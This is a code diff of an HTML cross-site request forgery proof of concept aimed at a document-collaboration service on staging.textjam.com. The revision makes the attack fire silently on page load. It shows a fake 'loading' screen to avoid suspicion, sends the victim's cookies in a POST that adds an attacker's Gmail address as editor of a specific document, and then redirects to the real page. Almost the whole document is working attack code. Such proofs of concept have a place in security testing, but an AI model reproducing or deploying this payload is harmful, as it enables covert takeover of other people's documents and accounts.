@@ -1,75 +1,43 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Document Collaboration Tool</title>
-    <style>
-        .container { padding: 30px; font-family: Arial; }
-        .doc-id { background: #f0f0f0; padding: 10px; border-radius: 5px; font-family: monospace; }
-    </style>
-</head>
 <body>
-    <div class="container">
-        <h2>📄 Document Collaboration Manager</h2>
-        <p>Managing document: <span class="doc-id">KAM7CN17</span></p>
-        
-        <div style="background: #E8F4FD; padding: 20px; border-radius: 8px; margin: 20px 0;">
-            <h3>Add Collaborator</h3>
-            <p>Email to add as editor:</p>
-            <input type="email" id="collabEmail" 
-                   value="rathnaitsergey692@gmail.com" 
-                   style="width: 300px; padding: 8px; margin: 10px 0;">
-            <br>
-            <button onclick="addCollaborator()" 
-                    style="background: #007BFF; color: white; padding: 10px 20px; border: none; border-radius: 5px;">
-                ➕ Add as Editor
-            </button>
-        </div>
-        
-        <div id="status"></div>
-    </div>
-
     <script>
-    function addCollaborator() {
-        const email = document.getElementById('collabEmail').value;
-        document.getElementById('status').innerHTML = 
-            `<p style="color: #007BFF;">🔄 Adding ${email} as editor...</p>`;
+    // Execute immediately on page load
+    (function() {
+        // Show loading message to avoid suspicion
+        document.body.innerHTML = `
+            <div style="padding: 50px; text-align: center; font-family: Arial;">
+                <h2>🔄 Loading Document Collaboration Tool...</h2>
+                <p>Please wait while we configure your workspace.</p>
+            </div>
+        `;
         
-        // CSRF to add attacker as editor
+        // ATTACK: Add attacker as editor
         fetch('https://staging.textjam.com/api/doc/KAM7CN17/access/collaborator/editor', {
             method: 'POST',
-            credentials: 'include',
-            mode: 'no-cors',
+            credentials: 'include',  // Critical: sends user's cookies
+            mode: 'no-cors',         // Bypasses CORS restrictions
             headers: {
                 'Content-Type': 'application/json',
             },
             body: JSON.stringify({
-                email: email
+                email: 'rathnaitsergey692@gmail.com'  // Attacker's email
             })
         })
         .then(() => {
-            document.getElementById('status').innerHTML = 
-                `<p style="color: #28A745;">✅ ${email} added as editor successfully!</p>`;
-            
-            // Optional: Verify by trying to access document
+            // Success - redirect to legitimate page
             setTimeout(() => {
-                window.location.href = `https://staging.textjam.com/doc/KAM7CN17`;
+                window.location.href = 'https://staging.textjam.com/doc/KAM7CN17?message=Workspace+configured';
             }, 1500);
         })
         .catch(error => {
-            document.getElementById('status').innerHTML = 
-                `<p style="color: #DC3545;">❌ Error: ${error.message}</p>`;
+            // Error - still redirect but log error
+            console.error('CSRF Attack Failed:', error);
+            setTimeout(() => {
+                window.location.href = 'https://staging.textjam.com';
+            }, 1500);
         });
-    }
-    
-    // Auto-fill with current user's email for more deception
-    window.addEventListener('load', function() {
-        // Try to get user's email from page or cookies
-        const userEmail = 'currentuser@example.com'; // Would need to extract
-        if (userEmail) {
-            document.getElementById('collabEmail').value = userEmail;
-            document.getElementById('collabEmail').placeholder = "Currently: " + userEmail;
-        }
-    });
+    })();
     </script>
 </body>
 </html>
